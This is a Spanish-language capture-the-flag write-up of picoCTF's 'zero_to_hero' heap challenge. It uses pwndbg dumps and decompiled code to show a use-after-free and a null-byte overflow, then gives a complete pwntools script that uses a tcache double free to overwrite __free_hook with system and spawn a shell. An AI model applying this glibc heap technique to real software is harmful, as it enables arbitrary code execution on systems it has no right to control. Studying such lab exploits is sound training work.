---
title: "Zero_to_hero"
date: "2025-12-20"
tags: ["picoCTF", "tcache", "null byte", "ret2libc", "heap"]
---


En este ejercicio nos dan el pack completo menos el código:

- Binario
- Libc
- ld

El binario es un playground donde podemos guardar cosas en el heap:

```c
./zero_to_hero
From Zero to Hero
So, you want to be a hero?
y
Really? Being a hero is hard.
Fine. I see I can't convince you otherwise.
It's dangerous to go alone. Take this: 0x7ad94a3f8fd0
1. Get a superpower
2. Remove a superpower
3. Exit
> 1
Describe your new power.
What is the length of your description?
> 20
Enter your description:
> hola
Done!
4. Get a superpower
5. Remove a superpower
6. Exit
> 2
Which power would you like to remove?
> 0
7. Get a superpower
8. Remove a superpower
9. Exit
```

Podemos comprobar que se guarda en el heap de la siguiente manera:

```c
pwndbg> vis

0x603000        0x0000000000000000      0x0000000000000251      ........Q.......
0x603010        0x0000000000000001      0x0000000000000000      ................
0x603020        0x0000000000000000      0x0000000000000000      ................
0x603030        0x0000000000000000      0x0000000000000000      ................
0x603040        0x0000000000000000      0x0000000000000000      ................
0x603050        0x0000000000603260      0x0000000000000000      `2`.............
0x603060        0x0000000000000000      0x0000000000000000      ................
0x603070        0x0000000000000000      0x0000000000000000      ................
0x603080        0x0000000000000000      0x0000000000000000      ................
0x603090        0x0000000000000000      0x0000000000000000      ................
0x6030a0        0x0000000000000000      0x0000000000000000      ................
0x6030b0        0x0000000000000000      0x0000000000000000      ................
0x6030c0        0x0000000000000000      0x0000000000000000      ................
0x6030d0        0x0000000000000000      0x0000000000000000      ................
0x6030e0        0x0000000000000000      0x0000000000000000      ................
0x6030f0        0x0000000000000000      0x0000000000000000      ................
0x603100        0x0000000000000000      0x0000000000000000      ................
0x603110        0x0000000000000000      0x0000000000000000      ................
0x603120        0x0000000000000000      0x0000000000000000      ................
0x603130        0x0000000000000000      0x0000000000000000      ................
0x603140        0x0000000000000000      0x0000000000000000      ................
0x603150        0x0000000000000000      0x0000000000000000      ................
0x603160        0x0000000000000000      0x0000000000000000      ................
0x603170        0x0000000000000000      0x0000000000000000      ................
0x603180        0x0000000000000000      0x0000000000000000      ................
0x603190        0x0000000000000000      0x0000000000000000      ................
0x6031a0        0x0000000000000000      0x0000000000000000      ................
0x6031b0        0x0000000000000000      0x0000000000000000      ................
0x6031c0        0x0000000000000000      0x0000000000000000      ................
0x6031d0        0x0000000000000000      0x0000000000000000      ................
0x6031e0        0x0000000000000000      0x0000000000000000      ................
0x6031f0        0x0000000000000000      0x0000000000000000      ................
0x603200        0x0000000000000000      0x0000000000000000      ................
0x603210        0x0000000000000000      0x0000000000000000      ................
0x603220        0x0000000000000000      0x0000000000000000      ................
0x603230        0x0000000000000000      0x0000000000000000      ................
0x603240        0x0000000000000000      0x0000000000000000      ................
0x603250        0x0000000000000000      0x0000000000000021      ........!.......
0x603260        0x0000000000000000      0x0000000000603010      .........0`.....         <-- tcachebins[0x20][0/1]
0x603270        0x0000000000000000 
```

Podemos ver aparte que hay tcache. Que version? vamos a comprobarlo:

```c
pwndbg> libc
libc version: 2.29
```

Esto tiene pinta de Tcache dumping. Pero hay un problema, si miramos el código podemos ver lo siguente:

```c
int fcn.004009c2(void)

{
    int iStack_c;

    iStack_c = 0;
    while( true ) {
        if (6 < iStack_c) {
            return -1;
        }
        if (*(iStack_c * 8 + 0x602060) == 0) break;
        iStack_c = iStack_c + 1;
    }
    return iStack_c;
}
```

Esta función hace que no podamos hacer mas `free` una vez llenemos la Tcache. Significa esto que no podemos conseguir un double free?

La versión 2.29 tiene una protección en la tcache que se basa en que el programa sabe si estás intentando hacer un free de un elemento que ya está en la tcache. Pero hay un detalle importante, SOLO TOMA EN CUENTA SI SON DEL MISMO SIZE. Es decir, si conseguimos de alguna forma hacer un free de un chunk, cambiarle el tamaño y volver a hacerle un free no nos comeríamos la protección. Para esto necesitamos 2 cosas:

- Que aunque un chunk esté liberado, permita ser liberado otra vez
- Que el programa tenga un fallo que permita cambiar el tamaño de un chunk


Vamos con la primera premisa. Podemos liberar 2 veces el mismo chunk? para eso deberia de, una vez liberado un chunk, que no se borre el puntero de la lista por ejemplo. Vamos a comprobarlo:

```c
// Viendo Guidra se que se escribe en 0x602060 el array de punteros

From Zero to Hero
So, you want to be a hero?
y
Really? Being a hero is hard.
Fine. I see I can't convince you otherwise.
It's dangerous to go alone. Take this: 0x7ffff7e31fd0
1. Get a superpower
2. Remove a superpower
3. Exit
> 1
Describe your new power.
What is the length of your description?
> 20
Enter your description:
> aaaa
Done!

pwndbg> dq 0x602060
0000000000602060     0000000000603260 0000000000000000
0000000000602070     0000000000000000 0000000000000000
0000000000602080     0000000000000000 0000000000000000
0000000000602090     0000000000000000 0000000000000000

pwndbg> x 0x603260
0x603260:       0x61616161


// Ahora vamos a hacer un free a ver si desaparece de la lista

Which power would you like to remove?
> 0
1. Get a superpower
2. Remove a superpower
3. Exit
   
pwndbg> dq 0x602060
0000000000602060     0000000000603260 0000000000000000
0000000000602070     0000000000000000 0000000000000000
0000000000602080     0000000000000000 0000000000000000
0000000000602090     0000000000000000 0000000000000000
```

No ha desaparecido! Primera premisa comprobada. Ahora la segunda:

Despues de investigar un rato el codigo he visto lo siguiente al crear un chunk:

```c
sym.imp.puts("Enter your description: ");
sym.imp.printf(0x400f08);
iVar1 = *(iStack_24 * 8 + 0x602060);
iVar3 = sym.imp.read(0,*(iStack_24 * 8 + 0x602060),uStack_28);
*(iVar3 + iVar1) = 0; // intercambia lo que haya en una dirección un byte por un NULO. Vamos a comprobar si está bien hecho

From Zero to Hero
So, you want to be a hero?
y
Really? Being a hero is hard.
Fine. I see I can't convince you otherwise.
It's dangerous to go alone. Take this: 0x7ffff7e31fd0
1. Get a superpower
2. Remove a superpower
3. Exit
> 1
Describe your new power.
What is the length of your description?
> 24
Enter your description:
> aaaaaaaabaaaaaaacaaaaaaa
Done!
4. Get a superpower
5. Remove a superpower
6. Exit

0x603250        0x0000000000000000      0x0000000000000021      ........!.......
0x603260        0x6161616161616161      0x6161616161616162      aaaaaaaabaaaaaaa
0x603270        0x6161616161616163      0x0000000000020d00 // NULL BYTE
```

El null byte cae 1 byte despues del use-data de nuestro chunk, con lo cual podemos cambiar el tamaño de un chunk de por ejemplo 0x110 a 0x100. Se cumple el segundo requisito! Ya sabemos que podemos conseguir el control del flujo del programa. Solo queda saber a donde mandar el programa. No lo he mencionado hasta ahora pero el ejercicio nos devuelve un leak:

```c
It's dangerous to go alone. Take this: x 0x7ffff7e31fd0
```

Vamos a comprobar de que es:

```c
pwndbg> x 0x7ffff7e31fd0
0x7ffff7e31fd0 <__libc_system>: 0x74ff8548
```

Ultima pieza lista, tenemos que hacer un tcache double free -> ret2libc.

# Explotación Paso a Paso

## 1. Preparar el Terreno

Vamos a pedir 3 chunks de la siguiente manera:

```python
for n in range(2):
    malloc(b'264', b'hola')

malloc(b'248', b'hola')
```

Y vamos a liberarlos en el siguiente orden:

```python
free(b'1')
free(b'2')
free(b'0')
```

Esto se vería así:

```c
pwndbg> tcachebins
tcachebins
0x100 [  1]: 0x2f93b480 ◂— 0
0x110 [  2]: 0x2f93b260 —▸ 0x2f93b370 ◂— 0

0x2f93b250      0x0000000000000000      0x0000000000000111      ................
0x2f93b260      0x000000002f93b370      0x000000002f93b010      p../......./.... <-- tcachebins[0x110][0/2]
0x2f93b270      0x0000000000000000      0x0000000000000000      ................
0x2f93b280      0x0000000000000000      0x0000000000000000      ................
0x2f93b290      0x0000000000000000      0x0000000000000000      ................
0x2f93b2a0      0x0000000000000000      0x0000000000000000      ................
0x2f93b2b0      0x0000000000000000      0x0000000000000000      ................
0x2f93b2c0      0x0000000000000000      0x0000000000000000      ................
0x2f93b2d0      0x0000000000000000      0x0000000000000000      ................
0x2f93b2e0      0x0000000000000000      0x0000000000000000      ................
0x2f93b2f0      0x0000000000000000      0x0000000000000000      ................
0x2f93b300      0x0000000000000000      0x0000000000000000      ................
0x2f93b310      0x0000000000000000      0x0000000000000000      ................
0x2f93b320      0x0000000000000000      0x0000000000000000      ................
0x2f93b330      0x0000000000000000      0x0000000000000000      ................
0x2f93b340      0x0000000000000000      0x0000000000000000      ................
0x2f93b350      0x0000000000000000      0x0000000000000000      ................
0x2f93b360      0x0000000000000000      0x0000000000000111      ................
0x2f93b370      0x0000000000000000      0x000000002f93b010      .........../.... <-- tcachebins[0x110][1/2]
0x2f93b380      0x0000000000000000      0x0000000000000000      ................
0x2f93b390      0x0000000000000000      0x0000000000000000      ................
0x2f93b3a0      0x0000000000000000      0x0000000000000000      ................
0x2f93b3b0      0x0000000000000000      0x0000000000000000      ................
0x2f93b3c0      0x0000000000000000      0x0000000000000000      ................
0x2f93b3d0      0x0000000000000000      0x0000000000000000      ................
0x2f93b3e0      0x0000000000000000      0x0000000000000000      ................
0x2f93b3f0      0x0000000000000000      0x0000000000000000      ................
0x2f93b400      0x0000000000000000      0x0000000000000000      ................
0x2f93b410      0x0000000000000000      0x0000000000000000      ................
0x2f93b420      0x0000000000000000      0x0000000000000000      ................
0x2f93b430      0x0000000000000000      0x0000000000000000      ................
0x2f93b440      0x0000000000000000      0x0000000000000000      ................
0x2f93b450      0x0000000000000000      0x0000000000000000      ................
0x2f93b460      0x0000000000000000      0x0000000000000000      ................
0x2f93b470      0x0000000000000000      0x0000000000000101      ................
0x2f93b480      0x0000000000000000      0x000000002f93b010      .........../.... <-- tcachebins[0x100][0/1]
0x2f93b490      0x0000000000000000      0x0000000000000000      ................
0x2f93b4a0      0x0000000000000000      0x0000000000000000      ................
0x2f93b4b0      0x0000000000000000      0x0000000000000000      ................
0x2f93b4c0      0x0000000000000000      0x0000000000000000      ................
0x2f93b4d0      0x0000000000000000      0x0000000000000000      ................
0x2f93b4e0      0x0000000000000000      0x0000000000000000      ................
0x2f93b4f0      0x0000000000000000      0x0000000000000000      ................
0x2f93b500      0x0000000000000000      0x0000000000000000      ................
0x2f93b510      0x0000000000000000      0x0000000000000000      ................
0x2f93b520      0x0000000000000000      0x0000000000000000      ................
0x2f93b530      0x0000000000000000      0x0000000000000000      ................
0x2f93b540      0x0000000000000000      0x0000000000000000      ................
0x2f93b550      0x0000000000000000      0x0000000000000000      ................
0x2f93b560      0x0000000000000000      0x0000000000000000      ................
0x2f93b570      0x0000000000000000      0x0000000000020a91      ................ <-- Top chunk
```

## 2. Double Free

Como el chunk 0 (hablando de index) es el ultimo al que hicimos free, el siguiente malloc de tamaño 0x100 usará su espacio. Vamos a aprovechar el null byte poisoning para bajarle el tamaño al chunk 1 (que actualmente está liberado en la tcaché), para posteriormente liberar otra vez el chunk 1 y crear el double free. Recordemos que este segundo free no crashea porque ahora el chunk 1 es de diferente tamaño y esto hace que el chunk 1 esté liberado 2 veces pero en bins de la tcache diferentes de tamaño.

```c
malloc(b'264', b'A' * 264)
free(b'1')
```

Vamos a comprobar como se ve esto:

```c
pwndbg> tcachebins
tcachebins
0x100 [  2]: 0x19028370 —▸ 0x19028480 ◂— 0
0x110 [  1]: 0x19028370 —▸ 0x19028480 ◂— ...
```

Como podemos ver, el chunk 1 (`0x19028370`) está en los 2 bins.

## 3. Hijack del flujo

Para conseguir controlar el flujo solo tenemos que hacer un malloc para cambiar el FD del chunk 1 por la dirección que queramos. En este caso vamos a por el `__free__hook`:

```python
malloc(b'264',p64(libc.sym["__free_hook"]))
```

Vamos a ver el impacto:

```c
pwndbg> tcachebins
tcachebins
0x100 [  2]: 0xe706370 —▸ 0x7d5c1a6c45a8 (__free_hook) ◂— 0
0x110 [  0]: 0xe706480 ◂— ...
```

Como podemos ver, cuando hagamos 2 mallocs mas de size 0x100, en el segundo lo que escribamos caerá en el free_hook. 

## 4. Shell

Para conseguir la shell solo quedaria meter `system(/bin/sh)` en el free hook. Como tenemos la dirección de system solo nos queda el `/bin/sh`. Lo vamos a hacer de una forma muy elegante. 

Ya que hay que hacer un malloc de algo antes del malloc que toca el `__free_hook` vamos a meter ahí ya el `/bin/sh`. Y luego al hacer un free, tal vez de un free al meter system en el free_hook se haría un system(algo). Y si tal vez de ese algo ponemos el indice del chunk con `/bin/sh` estariamos haciendo exactamente `system(/bin/sh)`. Vamos a ponernos manos a la obra:

```c
malloc(b'248', b'/bin/sh\n')
malloc(b'248',p64(libc.sym["system"]))

free(b'1')
```

Si juntamos todo el script se vería así:

```python
from pwn import *

e = ELF("./zero_to_hero_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.29.so")
context.binary = e
context.log_level = 'debug'

def malloc(size, msg):
    io.sendline(b'1')
    io.recvuntil(b'> ')
    io.sendline(size)
    io.recvuntil(b'> ')
    io.sendline(msg)
    io.recvuntil(b'> ')

def free(index):
    io.sendline(b'2')
    io.recvuntil(b'> ')
    io.sendline(index)
    io.recvuntil(b'> ')

io = start()

io.recvuntil(b'hero?\n')
io.sendline(b'y')

io.recvuntil(b': ')
leak_system = int(io.recvline().strip(), 16)

info(f'Leak de system = {hex(leak_system)}')
libc.address = leak_system - libc.sym.system
info(f'Libc address = {hex(libc.address)}')

for n in range(2):
    malloc(b'264', b'hola')

malloc(b'248', b'hola')

free(b'1')
free(b'2')
free(b'0')

malloc(b'264', b'A' * 264)
free(b'1')

malloc(b'264',p64(libc.sym["__free_hook"]))

malloc(b'248', b'/bin/sh\n')
malloc(b'248',p64(libc.sym["system"]))

free(b'1') # Triggereamos el exploit

io.interactive()
```

```c
ub1cu0@grr:~/Escritorio/PWN/picoCTF/zero_to_hero$ python3 solve.py
[*] '/home/ub1cu0/Escritorio/PWN/picoCTF/zero_to_hero/zero_to_hero_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
[*] '/home/ub1cu0/Escritorio/PWN/picoCTF/zero_to_hero/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
    Debuginfo:  Yes
[*] '/home/ub1cu0/Escritorio/PWN/picoCTF/zero_to_hero/ld-2.29.so'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
$ whoami
ub1cu0
$ ls
ld-2.29.so  libc.so.6  solve.py  zero_to_hero  zero_to_hero_patched
```

Funciona! Gracias por leer!